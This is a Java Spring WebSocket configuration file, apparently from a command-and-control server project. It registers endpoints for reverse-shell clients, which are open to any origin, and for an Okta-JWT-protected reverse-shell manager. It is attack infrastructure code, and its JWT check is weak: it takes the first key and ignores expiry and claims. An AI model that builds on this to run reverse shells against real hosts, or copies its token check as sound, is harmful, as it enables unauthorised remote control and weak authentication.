package com.mtattab.c2cServer.config;

import com.mtattab.c2cServer.controller.websocket.ReverseShellClientsHandler;
import com.mtattab.c2cServer.controller.websocket.ReverseShellManagerHandler;
import com.nimbusds.jose.JWSVerifier;
import com.nimbusds.jose.crypto.RSASSAVerifier;
import com.nimbusds.jose.jwk.JWK;
import com.nimbusds.jose.jwk.JWKSet;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpStatus;
import org.springframework.http.server.ServerHttpRequest;
import org.springframework.http.server.ServerHttpResponse;
import org.springframework.security.config.annotation.web.socket.AbstractSecurityWebSocketMessageBrokerConfigurer;
import org.springframework.security.config.annotation.web.socket.EnableWebSocketSecurity;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.util.StringUtils;
import org.springframework.web.socket.WebSocketHandler;
import org.springframework.web.socket.config.annotation.EnableWebSocket;
import org.springframework.web.socket.config.annotation.WebSocketConfigurer;
import org.springframework.web.socket.config.annotation.WebSocketHandlerRegistry;
import org.springframework.web.socket.server.HandshakeHandler;
import org.springframework.web.socket.server.HandshakeInterceptor;
import org.springframework.web.socket.server.support.DefaultHandshakeHandler;

import java.security.Principal;
import java.security.interfaces.RSAPublicKey;
import java.util.List;
import java.util.Map;

import static com.mtattab.c2cServer.util.Constants.*;

@Configuration
@EnableWebSocket
public class WebSocketConfig  implements WebSocketConfigurer {

    @Autowired
    ReverseShellClientsHandler reverseShellClientsHandler;

    @Autowired
    ReverseShellManagerHandler reverseShellManagerHandler;

    @Autowired
    @Qualifier(OKTA_BEAN)
    private String oktaPublicKeys;

    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(reverseShellClientsHandler, WEBSOCKET_REVERSE_SHELL)
                .setAllowedOrigins("*")

                .addHandler(reverseShellManagerHandler, WEBSOCKET_REVERSE_SHELL_MANAGER)
                .addInterceptors(
                        handshakeInterceptor()
                )

        ;


    }

    public HandshakeInterceptor handshakeInterceptor() {
        return new HandshakeInterceptor() {

            @Override
            public boolean beforeHandshake(ServerHttpRequest request, ServerHttpResponse response,
                                           WebSocketHandler wsHandler, Map<String, Object> attributes) throws Exception {

                String token = getToken(request);

                boolean isTheRequestComingFromMangerSocket =  request.getURI().getPath().toLowerCase().contains(WEBSOCKET_REVERSE_SHELL_MANAGER.toLowerCase());
                // the request should be authenticated only if it comes from the manager socket
                if ( isTheRequestComingFromMangerSocket && !validateToken(token) ){
                    response.setStatusCode(HttpStatus.UNAUTHORIZED);

                    return false;
                }
                return true;
            }

            @Override
            public void afterHandshake(ServerHttpRequest request, ServerHttpResponse response,
                                       WebSocketHandler wsHandler, Exception exception) {
            }
        };
    }

    private String getToken(ServerHttpRequest request){
        String token = "";
        if (request.getURI().getQuery()!= null){
            token = request.getURI().getQuery().replace("auth=", "");

        }
        return token;
    }


// this will check if the token is valid from okta server
    public boolean validateToken(String token) {
        try {
            // Parse the JSON representation of public keys
            JWKSet jwkSet = JWKSet.parse(this.oktaPublicKeys);

            // Obtain the public key that corresponds to the private key used to sign the JWT
            List<JWK> keys = jwkSet.getKeys();

            // Choose the correct key based on your application's logic
            JWK chosenKey = keys.get(0); // Replace this with your actual logic to choose the key

            // Convert the JWK to an actual public key
            RSAPublicKey publicKey = chosenKey.toRSAKey().toRSAPublicKey();

            // Perform JWT verification using the chosen public key
            SignedJWT signedJWT = SignedJWT.parse(token);
            if (signedJWT.verify(new RSASSAVerifier(publicKey))) {
                // Token is valid
                return true;
            } else {
                // Token signature verification failed
                return false;
            }
        } catch (Exception e) {
            // Token parsing or verification failed
            e.printStackTrace();
            return false;
        }
    }
}



